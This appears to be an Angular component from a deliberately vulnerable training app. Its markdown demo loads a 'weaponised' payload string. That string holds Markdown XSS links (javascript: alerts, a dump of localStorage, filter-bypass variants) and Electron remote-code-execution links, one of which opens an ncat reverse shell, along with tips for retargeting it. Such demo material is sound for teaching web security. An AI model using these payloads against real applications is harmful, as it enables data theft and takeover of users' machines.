import { AfterViewInit, ChangeDetectionStrategy, ChangeDetectorRef, Component } from '@angular/core';
import { FormControl, FormGroup } from '@angular/forms';
import { ActivatedRoute, Params } from '@angular/router';
import { MarkdownQueryParams } from 'app/shared/models/app-routes.model';

/* tslint:disable:no-trailing-spaces */
@Component({
    selector: 'vulnerable-markdown',
    templateUrl: './markdown.component.html',
    styleUrls: ['./markdown.component.scss'],
    changeDetection: ChangeDetectionStrategy.OnPush
})
export class MarkdownComponent implements AfterViewInit {
    // Demo XXS payloads
    demoWeaponised: string = `### Demo Markdown XSS Payloads

[Basic XSS](javascript:alert('Basic'))

[What's in LocalStorage?](javascript:alert(JSON.stringify(localStorage)))

[Case may bypass bad XSS filters](JaVaScRiPt:alert('CaseInsensitive'))

[URL](javascript://www.google.com%0Aalert('URL'))

### Electron Remote Code Execution Demo

[RCE - dir](javascript:require('child_process').exec('dir',function(e,r){alert(r)}))

[RCE - Reverse TCP Shell](javascript:require('child_process').exec('ncat%20127.0.0.1%2011235%20-e%20cmd.exe'))

#### Notes

* Spaces break things, encoding is your friend
* Play around, different implementations produce different results
* For a shell, you'll need to update IP and port, plus have nc installed on your target

`;

    /**
     * demo with no exploits, just regular md
     */
    demoNotWeaponised: string = `# H1
## H2
### H3
#### H4
##### H5
###### H6

## Styles

Emphasis, aka italics, with *asterisks* or _underscores_.

Strong emphasis, aka bold, with **asterisks** or __underscores__.

Combined emphasis with **asterisks and _underscores_**.

Strikethrough uses two tildes. ~~Scratch this.~~

## Links and images

[I'm an inline-style link](https://www.google.com)

![alt text](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Logo Title Text 1")

`;

    /**
     * form controlling the markdown state
     */
    markdownForm: FormGroup = new FormGroup({
        markdownTextarea: new FormControl()
    });

    /**
     * current payload loaded into markdown form
     */
    activatedPayload: string;

    constructor(private readonly activatedRoute: ActivatedRoute, private readonly cdRef: ChangeDetectorRef) {}

    ngAfterViewInit(): void {
        this.activatedRoute.queryParams.subscribe((params: Params) => {
            switch (params.demo) {
                case MarkdownQueryParams.CLEAN: {
                    this.activatedPayload = '';
                    break;
                }
                case MarkdownQueryParams.NOT_WEAPONISED: {
                    this.activatedPayload = this.demoNotWeaponised;
                    break;
                }
                case MarkdownQueryParams.WEAPONISED: {
                    this.activatedPayload = this.demoWeaponised;
                    break;
                }
                default: {
                    this.activatedPayload = '';
                }
            }
            // patch markdown into the form
            this.markdownForm.controls.markdownTextarea.setValue(this.activatedPayload);
            this.cdRef.detectChanges();
        });
    }
}
